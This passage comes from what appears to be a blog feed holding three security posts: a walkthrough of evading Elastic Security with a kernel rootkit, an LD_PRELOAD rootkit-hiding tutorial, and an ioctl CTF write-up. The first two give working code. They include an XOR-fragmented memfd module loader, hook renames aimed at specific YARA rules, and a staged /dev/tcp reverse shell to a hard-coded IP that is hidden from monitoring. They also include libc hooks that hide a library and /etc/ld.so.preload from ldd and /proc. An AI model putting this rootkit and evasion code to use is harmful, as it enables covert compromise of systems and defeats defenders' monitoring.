\u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and 